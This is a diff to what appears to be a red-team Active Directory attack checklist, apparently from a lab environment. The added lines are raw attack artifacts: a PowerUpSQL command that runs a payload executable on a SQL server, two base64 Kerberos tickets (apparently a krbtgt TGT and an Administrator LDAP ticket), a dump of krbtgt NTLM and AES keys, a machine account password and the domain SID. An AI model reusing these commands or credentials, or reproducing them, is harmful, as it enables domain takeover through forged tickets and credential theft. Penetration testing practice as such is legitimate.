@@ -118,7 +118,52 @@ powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
 - [ ]  Check if NTLM Relaying to ADCS HTTP Endpoints (ESC8) ****is possible to abuse.
 - [ ]  Check for Vulnerable GPO , and find the associated OU and the Computers/Users, Then Modify the GPO to get beacon.
 - [ ]  Check if you can a new GPO and Configure it , and then link it to any OU where the interesting Users/Computers may be present to get beacon on them.
-- [ ]  Check for SQL Servers and SQL Links and Look for sysadmin (on all links) priv or XP_CMDSHELL enabled or not.
 - [ ]  Check if any SQL Servers have any interesting databases , where credentials or anything interesting may be stored.
 - [ ]  Check if any accessible shares have any interesting files.
 - [ ]  Check if LAPS is being used and try to abuse it.
+
+powerpick Invoke-SQLOSCmd -Instance "db.kato.org,1433" -Command "C:\Windows\Tasks\run.exe" -RawResults
+
+
+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
+
+
+
+
+41dfe5317cd566cc3e68e33d9e8798790b2181cca14a00c1dcd64aa1e8738ddb
+
+AM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 10/6/2022 11:58:44 AM
+Object Security ID   : S-1-5-21-2708793558-3453453652-160833008-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 050f62c9bb535345f14defa592ce499e
+    ntlm- 0: 050f62c9bb535345f14defa592ce499e
+    lm  - 0: 4cada81a21087460704b022249917800
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : f2a95e4189642cf31dadc31d7e6a1df0
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : KATO.ORGkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 41dfe5317cd566cc3e68e33d9e8798790b2181cca14a00c1dcd64aa1e8738ddb
+      aes128_hmac       (4096) : 7e10ed4fa5f6f0c4935277c0bb0ce2a9
+      des_cbc_md5       (4096) : c2d33ee90ed96d0b
+
+
+
+kato.org\db$ H@fWIk<B]U(:E->:]aBJK':CMcT-FVoWu/!oZ^q14fIM_foA*TRNP:]U'7W@BcGfZyX;.ZeippR>b_S=X#icO5&^yhRT%J$g08Hz'8`*:'$P;Hf3nMj)FhZi
+
+
+S-1-5-21-2708793558-3453453652-160833008
